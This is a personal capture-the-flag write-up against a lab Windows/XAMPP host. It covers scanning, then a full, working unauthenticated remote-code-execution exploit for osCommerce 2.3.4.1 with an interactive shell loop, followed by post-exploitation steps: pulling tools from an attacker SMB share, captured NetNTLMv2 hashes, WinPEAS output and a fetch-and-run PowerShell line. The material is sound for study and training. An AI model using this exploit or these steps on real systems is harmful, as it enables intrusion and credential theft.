# CTF 11.RobJeck

## Scout Regiments

### Netdiscover

### Nmap scan

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# nmap -A -Pn -n -p-  192.168.100.102 --min-rate 10000 -o robjeckNmapScam.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 13:20 EDT

Nmap scan report for 192.168.100.102

Host is up (0.00041s latency).

Not shown: 65532 filtered tcp ports (no-response)

PORT     STATE SERVICE    VERSION

80/tcp   open  http       Apache httpd 2.4.26 ((Win32) OpenSSL/1.0.2l PHP/5.6.31)

| http-robots.txt: 2 disallowed entries

|_/ /oscommerce-2.3.4/

|_http-server-header: Apache/2.4.26 (Win32) OpenSSL/1.0.2l PHP/5.6.31

| http-title: Welcome to XAMPP

|_Requested resource was http://192.168.100.102/dashboard/

443/tcp  open  ssl/http   Apache httpd 2.4.26 ((Win32) OpenSSL/1.0.2l PHP/5.6.31)

| ssl-cert: Subject: commonName=localhost

| Not valid before: 2009-11-10T23:48:47

|_Not valid after:  2019-11-08T23:48:47

|_ssl-date: TLS randomness does not represent time

| tls-alpn:

|_  http/1.1

| http-title: Welcome to XAMPP

|_Requested resource was https://192.168.100.102/dashboard/

|_http-server-header: Apache/2.4.26 (Win32) OpenSSL/1.0.2l PHP/5.6.31

| http-robots.txt: 2 disallowed entries

|_/ /oscommerce-2.3.4/

7680/tcp open  pando-pub?

MAC Address: 00:0C:29:F6:4D:58 (VMware)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Device type: general purpose

Running (JUST GUESSING): Microsoft Windows XP|2019 (89%)

OS CPE: cpe:/o:microsoft:windows_xp::sp3

Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2019 (85%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 1 hop

TRACEROUTE

HOP RTT     ADDRESS

1   0.41 ms 192.168.100.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 64.16 seconds
```

### Nikto scan

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# nikto -h 192.168.100.102

- Nikto v2.5.0

---------------------------------------------------------------------------

+ Target IP:          192.168.100.102

+ Target Hostname:    192.168.100.102

+ Target Port:        80

+ Start Time:         2024-04-04 13:36:06 (GMT-4)

---------------------------------------------------------------------------

+ Server: Apache/2.4.26 (Win32) OpenSSL/1.0.2l PHP/5.6.31

+ /: Retrieved x-powered-by header: PHP/5.6.31.

+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/

+ Root page / redirects to: http://192.168.100.102/dashboard/

+ /oscommerce-2.3.4/: Cookie osCsid created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

+ /robots.txt: Entry '/oscommerce-2.3.4/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file

+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt

+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275

+ Apache/2.4.26 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.

+ OpenSSL/1.0.2l appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.

+ PHP/5.6.31 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.

+ PHP/5.6 - PHP 3/4/5 and 7.0 are End of Life products without support.

+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing

+ /img/: Directory indexing found.

+ /img/: This might be interesting.

+ /icons/: Directory indexing found.

+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/

+ 8910 requests: 0 error(s) and 16 item(s) reported on remote host

+ End Time:           2024-04-04 13:37:18 (GMT-4) (72 seconds)

---------------------------------------------------------------------------

+ 1 host(s) tested
```

### Web Application Scouting

Found the CMS which results in nmap but it's not rendering

> To troubleshoot that, open the inspect tab in the browser and swap to the network tab, then reload the page to view the traffic and see why page rendering fails.

> Found the reason why image rendering fails: it is calling out `localhost`, and Kali doesn't have the DNS entry for localhost. Even if the DNS resolves to `127.0.0.1`, in Kali the images don't exist.

> There are two ways to solve this DNS resolve issue.

> First, edit the `/etc/hosts` file and add `localhost` to resolve to the CMS IP address, which is `192.168.100.102`.

> Second, Burp Suite has a feature called hostname which can let you change the local hosts.

```
192.168.100.102	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
```

### Searchsploit

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# searchsploit Apache httpd 2.4

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Apache 2.4.23 mod_http2 - Denial of Service                                                                                                                                      | linux/dos/40909.py

Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                                         | multiple/webapps/50383.sh

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# searchsploit oscommerce 2.3.4

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                                                      | php/webapps/34582.txt

osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                                                    | php/webapps/46328.txt

osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                                                 | php/webapps/46329.txt

osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                                                  | php/webapps/46330.txt

osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                                                     | php/webapps/49103.txt

osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                                                       | php/webapps/43191.py

osCommerce 2.3.4.1 - Remote Code Execution                                                                                                                                       | php/webapps/44374.py

osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                                                                                   | php/webapps/50128.py

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# searchsploit -m php/webapps/44374.py .

Exploit: osCommerce 2.3.4.1 - Remote Code Execution

URL: https://www.exploit-db.com/exploits/44374

Path: /usr/share/exploitdb/exploits/php/webapps/44374.py

Codes: N/A

Verified: True

File Type: ASCII text

Copied to: /home/hasanrehni/Desktop/CTF/robjeck/44374.py

Exploit:

URL: https://www.exploit-db.com/exploits/44374

Path: /usr/share/exploitdb/exploits/php/webapps/44374.py

Codes: N/A

Verified: False

File Type: ASCII text

cp: overwrite '/home/hasanrehni/Desktop/CTF/robjeck/44374.py'?

Copied to: /home/hasanrehni/Desktop/CTF/robjeck/44374.py
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# ls -lla

total 16

drwxr-xr-x 2 root root 4096 Apr  4 14:03 .
drwxr-xr-x 4 root root 4096 Apr  4 13:18 ..
-rwxr-xr-x 1 root root 1794 Apr  4 14:03 44374.py
-rw-r--r-- 1 root root 1822 Apr  4 13:21 robjeckNmapScam.txt
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# searchsploit -m php/webapps/50128.py

Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)

URL: https://www.exploit-db.com/exploits/50128

Path: /usr/share/exploitdb/exploits/php/webapps/50128.py

Codes: N/A

Verified: False

File Type: Python script, ASCII text executable

Copied to: /home/hasanrehni/Desktop/CTF/robjeck/50128.py
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# ls

44374.py  50128.py  robjeckNmapScam.txt
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]

└─# python3 50128.py

please specify the osCommerce url

format: python3 osCommerce2_3_4RCE.py <url>

eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog

┌──(root㉿kali)-[/home/hasanrehni/Desktop/CTF/robjeck]
```

### Understanding the exploit

## Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)

## Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin

## Exploit: Exploiting the install.php finish process by injecting php payload into the db\_database parameter & read the system command output from configure.php

## Notes: The RCE doesn't need to be authenticated

## Date: 26/06/2021

## Exploit Author: Bryan Leong

## Vendor Homepage: https://www.oscommerce.com/

## Version: osCommerce 2.3.4

## Tested on: Windows

```python
import requests

import sys

if(len(sys.argv) != 2):

print("please specify the osCommerce url")

print("format: python3 osCommerce2_3_4RCE.py <url>")

print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")

sys.exit(0)

baseUrl = sys.argv[1]

testVulnUrl = baseUrl + '/install/install.php'

def rce(command):

#targeting the finish step which is step 4

targetUrl = baseUrl + '/install/install.php?step=4'

payload = "');"

payload += "passthru('" + command + "');"    # injecting system command here

payload += "/*"

#injecting parameter

data = {

'DIR_FS_DOCUMENT_ROOT': './',

'DB_DATABASE' : payload

}

response = requests.post(targetUrl, data=data)

if(response.status_code == 200):

#print('[*] Successfully injected payload to config file')

readCMDUrl = baseUrl + '/install/includes/configure.php'

cmd = requests.get(readCMDUrl)

commandRsl = cmd.text.split('\n')

if(cmd.status_code == 200):

#print('[*] System Command Execution Completed')

#removing the error message above

for i in range(2, len(commandRsl)):

print(commandRsl[i])

else:

return '[!] Configure.php not found'

else:

return '[!] Fail to inject payload'

#testing vulnerability accessing the directory

test = requests.get(testVulnUrl)

#checking the install directory still exist or able to access or not

if(test.status_code == 200):

print('[*] Install directory still available, the host likely vulnerable to the exploit.')

#testing system command injection

print('[*] Testing injecting system command to test vulnerability')

cmd = 'whoami'

print('User: ', end='')

err = rce(cmd)

if(err != None):

print(err)

sys.exit(0)

while(True):

cmd = input('RCE_SHELL$ ')

err = rce(cmd)

if(err != None):

print(err)

sys.exit(0)

else:

print('[!] Install directory not found, the host is not vulnerable')

sys.exit(0)
```

### ChatGTP

Sure, let's break down this code into simpler terms:

**Purpose of the Code**:

This code is a hacking tool designed to exploit a vulnerability in osCommerce version 2.3.4 if the "/install" directory hasn't been removed after installation.

**What Does It Do?**

The code tries to:

1. **Input Check**: Make sure the user provides the website's URL.
2. **Vulnerability Check**: See if the website still has the "/install" directory. If it does, the website might be vulnerable.
3. **Inject Malicious Code**: The code injects malicious PHP code into the website's setup process.
4. **Execute Commands**: After injecting the code, it runs system commands on the website to check if it's vulnerable.
5. **Provide Remote Control**: If successful, it gives the hacker a way to send more commands to the website.

**How Does the Code Work?**

Let's go step by step:

1. **Input Validation**:

* Checks if the user provided the website's URL.

2. **Setting Up**:

* The code sets the base URL for the osCommerce website and checks the vulnerability by trying to access the "/install" directory.

3. **Exploit Function (rce)**:

* This function prepares the payload (the malicious code) to be injected.
* Sends the payload to the website's setup process.
* Reads the system command output from the website.

4. **Main Execution**:

* If the website is vulnerable, it tries a test command (`whoami`) to see if it can run commands.
* If successful, it provides a command prompt-like interface for the hacker to run more commands on the website.

**Summary**:

This code is a tool for hackers to exploit a security hole in osCommerce 2.3.4. If you run this code against a vulnerable website, it can potentially give the hacker full control over the website, allowing them to run commands and potentially take it over. Always make sure to remove unnecessary installation directories and keep your software updated to avoid such vulnerabilities.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

In simpler terms, this function is the heart of the exploit. It crafts a sneaky message (payload) to trick the vulnerable website into running a command, and then it reads and shows the website's response to that command.

### Upgrading the TTY

> www.revshells.com

### Configure SSH

```
PS C:\Windows> cd Temp

PS C:\Windows\Temp> ping 8.8.8.8

Pinging 8.8.8.8 with 32 bytes of data:

Reply from 8.8.8.8: bytes=32 time=6ms TTL=128

Reply from 8.8.8.8: bytes=32 time=5ms TTL=128

Reply from 8.8.8.8: bytes=32 time=4ms TTL=128

Reply from 8.8.8.8: bytes=32 time=29ms TTL=128

Ping statistics for 8.8.8.8:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 4ms, Maximum = 29ms, Average = 11ms

PS C:\Windows\Temp> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

PS C:\Windows\Temp> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName

-------  ------    -----      -----     ------     --  -- -----------

90       6     2664       4440       0.03   2032   0 cmd

97       7     6232      10012       0.00    996   0 conhost

539      19     1676       5080               412   0 csrss

170      14     1576       4712               496   1 csrss

54       6      816       3496              2920   0 CustomDevService

252      14     3752      13680              3704   0 dllhost

681      26    31700      55116               264   1 dwm

32       5     1192       3200               792   1 fontdrvhost

32       5     1256       3304               800   0 fontdrvhost

198      30     9348      19096       0.48   3076   0 httpd

579      77    46644      43864      14.03   3968   0 httpd

0       0      60          8                 0   0 Idle

561      33    18156      61256              1016   1 LogonUI

974      23     5764      16228               648   0 lsass

0       0      212       5256              1780   0 Memory Compression

314      19     9300      23584              2940   0 MoUsoCoreWorker

220      13     3212      10216              4476   0 msdtc

244      20   199088      30620              3048   0 mysqld

580      42    46580      60236       1.94   4748   0 powershell

0       6     2476      64356                92   0 Registry

694      40    16664      19556              4492   0 SearchIndexer

552      11     4392       9248               628   0 services

103       7     3576       6812              1824   0 SgrmBroker

53       3     1032       1208               296   0 smss

431      21     5248      15084              2428   0 spoolsv

224      12     3756       8892                60   0 svchost

305      19     4092      16512               624   0 svchost

54       5      856       3368               752   0 svchost

749      16     7800      17820               776   0 svchost

738      15     4348      10724               896   0 svchost

734      12     2644      10924               944   0 svchost

225       9     1928       7120               948   0 svchost

109       7     1332       5392              1008   0 svchost

196      11     1940       8732              1064   0 svchost

116       8     1528       6092              1076   0 svchost

3037      17    28772      41856              1128   0 svchost

371      18     5620      14780              1136   0 svchost

339      14    11184      14688              1168   0 svchost

199      11     2304      10496              1216   0 svchost

123       7     1324       5896              1228   0 svchost

123      15     3432       7588              1300   0 svchost

268      12     2456      11348              1324   0 svchost

192      15     6240      10052              1336   0 svchost

167      10     1848       8540              1348   0 svchost

216      10     1988       7444              1364   0 svchost

121       8     1428       7188              1528   0 svchost

376      15     4008      11720              1600   0 svchost

190      11     2152       9056              1664   0 svchost

416       9     2844       8848              1668   0 svchost

110       7     1244       5704              1692   0 svchost

115       9     1256       5536              1808   0 svchost

170      10     1712       7664              1848   0 svchost

157      10     1864       8128              1868   0 svchost

314      11     2512       8948              1884   0 svchost

246      13     2556       7736              2092   0 svchost

126      10     1472       6296              2100   0 svchost

358      14     2236       9528              2124   0 svchost

189      12     1988       8640              2188   0 svchost

402      20     7696      18588              2204   0 svchost

392      31     9828      18640              2236   0 svchost

791      92   186016      41600              2276   0 svchost

388      21   159956     166844              2292   0 svchost

308      18     4464      16408              2308   0 svchost

122       7     1232       5608              2340   0 svchost

181      11     1972       8080              2584   0 svchost

410      16     8248      18324              2664   0 svchost

357      16     2636      10532              2748   0 svchost

208      11     1988       8380              2832   0 svchost

271      26     3724      13996              2900   0 svchost

487      24    17184      32604              2944   0 svchost

332      18    16476      21648              2968   0 svchost

208      12     2352       9128              3064   0 svchost

353      18     4032      19280              3100   0 svchost

211      12     2384       9740              3176   0 svchost

102       7     1276       5400              3264   0 svchost

213      13     2816      11420              3936   0 svchost

764      31   134556      91368              3944   0 svchost

205      14     1880       7288              4700   0 svchost

270      16     3752      18296              4812   0 svchost

151       9     1740       9452              4960   0 svchost

157       9     1636       7396              5252   0 svchost

1659       0      196        156                 4   0 System

168      11     3056      10600              3084   0 VGAuthService

104       7     1372       5716              1540   0 vm3dservice

372      21     8896      20236              2820   0 vmtoolsd

159      11     1332       6896               488   0 wininit

223      11     2520      10872               584   1 winlogon

459      22    11560      25592              3512   0 WmiPrvSE

PS C:\Windows\Temp> powershell

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\Temp>

PS C:\Windows\Temp> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

PS C:\Windows\Temp> Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

PS C:\Windows\Temp> Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

PS C:\Windows\Temp> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

PS C:\Windows\Temp>

PS C:\Windows\Temp>

PS C:\Windows\Temp> dir

Directory: C:\Windows\Temp

Mode                 LastWriteTime         Length Name

----                 -------------         ------ ----

d-----        11/21/2020  11:09 AM                vmware-SYSTEM

d-----          4/4/2024  10:55 PM                WinSAT

-a----        4/4/2024  10:52 PM          16091 APPX.5ad3hnu0gc5eapqfzpm7tgfxh.tmp

-a----        4/4/2024  10:52 PM          10980 APPX.es27kj1hzc891x8alvv377bje.tmp

-a----        4/4/2024  10:52 PM          58789 APPX.gqw0anmr3t0n7qrwa4irbd6gd.tmp

-a----        4/4/2024  10:52 PM           4078 APPX.gvea66k913_7ubi4snao6crae.tmp

-a----        4/4/2024  10:52 PM            828 APPX.o6dp4o_9grk0jq7hg3zsaobdg.tmp

-a----        4/4/2024  10:45 PM              0 FXSAPIDebugLogFile.txt

-a----        4/4/2024  10:45 PM              0 FXSTIFFDebugLogFile.txt

-a----        4/4/2024  10:53 PM           3034 MpCmdRun.log

-a----        4/4/2024  10:43 PM          36898 vmware-vmsvc-SYSTEM.log

-a----        11/21/2020  11:10 AM             99 vmware-vmtoolsd-Administrator.log

-a----        4/4/2024  10:43 PM            297 vmware-vmtoolsd-SYSTEM.log

-a----        11/21/2020  11:11 AM           3505 vmware-vmusr-Administrator.log

-a----        4/4/2024  10:43 PM            288 vmware-vmvss-SYSTEM.log

PS C:\Windows\Temp> Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

PS C:\Windows\Temp> whoami

r0bj3ck\rob

PS C:\Windows\Temp> powershell

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\Temp>

PS C:\Windows\Temp> powershell Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'

PS C:\Windows\Temp> dir \\192.168.100.100\

PS C:\Windows\Temp> dir \\192.168.100.100

PS C:\Windows\Temp> dir \\192.168.100.100\smb

Directory: \\192.168.100.100\smb

Mode                 LastWriteTime         Length Name

----                 ------         ------ ----

-a----          5/6/2022   7:45 PM         572416 ssh-keyscan.exe

-a----          5/6/2022   7:45 PM         320512 scp.exe

-a----          5/6/2022   7:45 PM         398848 sftp.exe

-a----          5/6/2022   7:45 PM         393216 ssh-agent.exe

-a----          5/6/2022   7:45 PM         720896 ssh-keygen.exe

-a----          5/6/2022   7:45 PM        1073152 ssh.exe

-a----          5/6/2022   7:45 PM         506880 ssh-add.exe

PS C:\Windows\Temp> copy \\192.168.100.100\smb\ssh.exe

PS C:\Windows\Temp> dir

Directory: C:\Windows\Temp

Mode                 LastWriteTime         Length Name

----                 -------------         ------ ----

d-----        11/21/2020  11:09 AM                vmware-SYSTEM

d-----          4/4/2024  10:55 PM                WinSAT

-a----          4/4/2024  10:52 PM          16091 APPX.5ad3hnu0gc5eapqfzpm7tgfxh.tmp

-a----          4/4/2024  10:52 PM          10980 APPX.es27kj1hzc891x8alvv377bje.tmp

-a----          4/4/2024  10:52 PM          58789 APPX.gqw0anmr3t0n7qrwa4irbd6gd.tmp

-a----          4/4/2024  10:52 PM           4078 APPX.gvea66k913_7ubi4snao6crae.tmp

-a----          4/4/2024  10:52 PM            828 APPX.o6dp4o_9grk0jq7hg3zsaobdg.tmp

-a----          4/4/2024  10:45 PM              0 FXSAPIDebugLogFile.txt

-a----          4/4/2024  10:45 PM              0 FXSTIFFDebugLogFile.txt

-a----          4/4/2024  10:53 PM           3034 MpCmdRun.log

-a----          5/6/2022   7:45 PM        1073152 ssh.exe

-a----          4/4/2024  10:43 PM          36898 vmware-vmsvc-SYSTEM.log

-a----        11/21/2020  11:10 AM             99 vmware-vmtoolsd-Administrator.log

-a----          4/4/2024  10:43 PM            297 vmware-vmtoolsd-SYSTEM.log

-a----        11/21/2020  11:11 AM           3505 vmware-vmusr-Administrator.log

-a----          4/4/2024  10:43 PM            288 vmware-vmvss-SYSTEM.log

PS C:\Windows\Temp> copy \\192.168.100.100\smb\ssh-keygen.exe

PS C:\Windows\Temp> copy \\192.168.100.100\smb\ssh-add.exe

PS C:\Windows\Temp> dir

Directory: C:\Windows\Temp

Mode                 LastWriteTime         Length Name

----                 -------------         ------ ----

d-----        11/21/2020  11:09 AM                vmware-SYSTEM

d-----          4/4/2024  10:55 PM                WinSAT

-a----          4/4/2024  10:52 PM          16091 APPX.5ad3hnu0gc5eapqfzpm7tgfxh.tmp

-a----          4/4/2024  10:52 PM          10980 APPX.es27kj1hzc891x8alvv377bje.tmp

-a----          4/4/2024  10:52 PM          58789 APPX.gqw0anmr3t0n7qrwa4irbd6gd.tmp

-a----          4/4/2024  10:52 PM           4078 APPX.gvea66k913_7ubi4snao6crae.tmp

-a----          4/4/2024  10:52 PM            828 APPX.o6dp4o_9grk0jq7hg3zsaobdg.tmp

-a----          4/4/2024  10:45 PM              0 FXSAPIDebugLogFile.txt

-a----          4/4/2024  10:45 PM              0 FXSTIFFDebugLogFile.txt

-a----          4/4/2024  10:53 PM           3034 MpCmdRun.log

-a----          5/6/2022   7:45 PM         506880 ssh-add.exe

-a----          5/6/2022   7:45 PM         720896 ssh-keygen.exe

-a----          5/6/2022   7:45 PM        1073152 ssh.exe

-a----          4/4/2024  10:43 PM          36898 vmware-vmsvc-SYSTEM.log

-a----        11/21/2020  11:10 AM             99 vmware-vmtoolsd-Administrator.log

-a----          4/4/2024  10:43 PM            297 vmware-vmtoolsd-SYSTEM.log

-a----        11/21/2020  11:11 AM           3505 vmware-vmusr-Administrator.log

-a----          4/4/2024  10:43 PM            288 vmware-vmvss-SYSTEM.log

impacket-smbserver -smb2support smb /home/hasanrehni/Desktop/Tools/OpenSSH

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0

[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0

[*] Config file parsed

[*] Config file parsed

[*] Config file parsed

[*] Incoming connection (192.168.100.102,50053)

[*] AUTHENTICATE_MESSAGE (R0BJ3CK\rob,R0BJ3CK)

[*] User R0BJ3CK\rob authenticated successfully

[*] rob::R0BJ3CK:aaaaaaaaaaaaaaaa:769a43998575b5634f231f7da707a9f1:0101000000000000007a0b77be86da01e19e70eeefd27f4d00000000010010005a00500061004b0056004e0071006300030010005a00500061004b0056004e0071006300020010005a006f006c0072006b0044006d005900040010005a006f006c0072006b0044006d00590007000800007a0b77be86da010600040002000000080030003000000000000000000000000030000026939a8b1e4e018f0f3b87dc3430a080c583906f658dd27b2df974b420ec68b30a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e003100300030000000000000000000

[*] Connecting Share(1:IPC$)

[*] Connecting Share(2:smb)

[*] Disconnecting Share(1:IPC$)

[*] Disconnecting Share(2:smb)

[*] Closing down connection (192.168.100.102,50053)

[*] Remaining connections []

[*] Incoming connection (192.168.100.102,50054)

[*] AUTHENTICATE_MESSAGE (R0BJ3CK\rob,R0BJ3CK)

[*] User R0BJ3CK\rob authenticated successfully

[*] rob::R0BJ3CK:aaaaaaaaaaaaaaaa:33eb2355e1661503d23c499dc911e1bd:010100000000000000965985be86da01afe1c6bf81fc4c3900000000010010005a00500061004b0056004e0071006300030010005a00500061004b0056004e0071006300020010005a006f006c0072006b0044006d005900040010005a006f006c0072006b0044006d0059000700080000965985be86da010600040002000000080030003000000000000000000000000030000026939a8b1e4e018f0f3b87dc3430a080c583906f658dd27b2df974b420ec68b30a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e003100300030000000000000000000

[*] Connecting Share(1:smb)

[*] Disconnecting Share(1:smb)

[*] Closing down connection (192.168.100.102,50054)

[*] Remaining connections []

[*] Incoming connection (192.168.100.102,50055)

[*] AUTHENTICATE_MESSAGE (R0BJ3CK\rob,R0BJ3CK)

[*] User R0BJ3CK\rob authenticated successfully

[*] rob::R0BJ3CK:aaaaaaaaaaaaaaaa:3ab6bdd8a09bc72f667e6964d5c56308:010100000000000000fee28ebe86da01fcbb8839b610ae6e00000000010010005a00500061004b0056004e0071006300030010005a00500061004b0056004e0071006300020010005a006f006c0072006b0044006d005900040010005a006f006c0072006b0044006d0059000700080000fee28ebe86da010600040002000000080030003000000000000000000000000030000026939a8b1e4e018f0f3b87dc3430a080c583906f658dd27b2df974b420ec68b30a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e003100300030000000000000000000

[*] Connecting Share(1:smb)

[*] Disconnecting Share(1:smb)

[*] Closing down connection (192.168.100.102,50055)

[*] Remaining connections []

[*] Incoming connection (192.168.100.102,50056)

[*] AUTHENTICATE_MESSAGE (R0BJ3CK\rob,R0BJ3CK)

[*] User R0BJ3CK\rob authenticated successfully

[*] rob::R0BJ3CK:aaaaaaaaaaaaaaaa:a19cd0704474e1891d2a9efdecee4091:0101000000000000000c0a96be86da01a006c78d7cf030dd00000000010010005a00500061004b0056004e0071006300030010005a00500061004b0056004e0071006300020010005a006f006c0072006b0044006d005900040010005a006f006c0072006b0044006d00590007000800000c0a96be86da010600040002000000080030003000000000000000000000000030000026939a8b1e4e018f0f3b87dc3430a080c583906f658dd27b2df974b420ec68b30a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e003100300030000000000000000000

[*] Connecting Share(1:smb)

[*] Disconnecting Share(1:smb)

[*] Closing down connection (192.168.100.102,50056)

[*] Remaining connections []

PS C:\Windows\Temp> ./ssh-keygen.exe

Generating public/private rsa key pair.

Enter file in which to save the key (C:\Users\rob/.ssh/id_rsa):
```

```
┌──(root㉿kali)-[/home/hasanrehni/Desktop/Tools/OpenSSH]

└─# nmap -Pn -n -p 22 192.168.100.102

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 14:38 EDT

Nmap scan report for 192.168.100.102

Host is up (0.00042s latency).

PORT   STATE    SERVICE

22/tcp filtered ssh

MAC Address: 00:0C:29:F6:4D:58 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

### WinPEAS DUMP

Intersting things

???????????? PowerShell Settings

PowerShell v2 Version: 2.0

PowerShell v5 Version: 5.1.19041.1

PowerShell Core Version:

Transcription Settings:

Module Logging Settings:

Scriptblock Logging Settings:

PS history file: C:\Users\rob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost\_history.txt

PS history size: 882B

Directory: C:\Users\rob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

Mode LastWriteTime Length Name

***

-a---- 11/21/2020 12:59 AM 882 ConsoleHost\_history.txt

```
PS C:\> type C:\Users\rob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))`

choco install bitnami-xampp

New-Service

service-start CustomDevService

Start-Service CustomDevService

ps

ps -name CustomDevService

ps -name CustomDevService | select module

ps -name CustomDevService | Format-List *

ps -name CustomDevService | Format-List * | select Modules

ps -name CustomDevService | select Modules

ps -name CustomDevService | select Modules | Format-List

ps -name CustomDevService | select Modules | Format-List *

ps -name CustomDevService | select -ExpandProperty Modules

choco install bitnami-xampp

choco install bitnami-xampp

ps

ps -name  mysqld

ps -name  mysqld | Format-List *
```

```
PS C:\>

---

???????????? Users

? Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups

Current user: rob

Current groups: Domain Users, Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication

=================================================================================================

